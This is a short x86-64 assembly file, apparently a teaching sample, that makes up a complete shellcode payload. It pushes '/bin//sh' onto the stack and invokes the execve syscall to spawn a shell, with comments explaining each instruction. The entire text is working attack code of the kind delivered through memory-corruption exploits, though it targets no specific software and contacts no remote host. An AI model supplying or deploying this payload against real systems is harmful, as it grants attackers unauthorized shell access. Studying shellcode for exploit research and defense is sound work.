section .text
	global _start

_start:
    xor rsi, rsi
    mul rsi
    mov rbx, 0x68732f2f6e69622f	; String that contains "/bin//sh". Having two "/" does not affect the function.
    push rax			; Insert a null terminator into the stack
    push rbx			; Insert the string "/bin//sh" into the stack

    push rsp			; Insert the string "/bin//sh" into the stack
    pop rdi			; Pop the last value we pushed into the stack ("/bin//sh") put it into "rdi"

    mov al, 59			; Set the syscall function to "execve"
    syscall			; Execute the syscall
